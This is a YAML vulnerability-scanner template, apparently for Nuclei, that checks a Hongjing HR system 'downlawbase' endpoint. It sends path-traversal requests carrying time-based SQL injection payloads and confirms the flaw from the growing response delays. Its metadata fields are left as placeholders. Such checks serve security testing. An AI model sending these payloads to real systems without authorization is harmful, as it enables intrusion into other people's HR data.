id: hongjing-downlawbase-sqli
info:
  name: Template Name
  author: apple
  severity: high
  description: description
  reference:
    - https://github.com/dioos886/2024-POC/blob/main/%E5%AE%8F%E6%99%AFHR%E7%B3%BB%E7%BB%9F-DigestDownLoad%E6%8E%A5%E5%8F%A3sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:3'--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
      - |-
        GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:6'--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
      - |-
        GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:9'--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"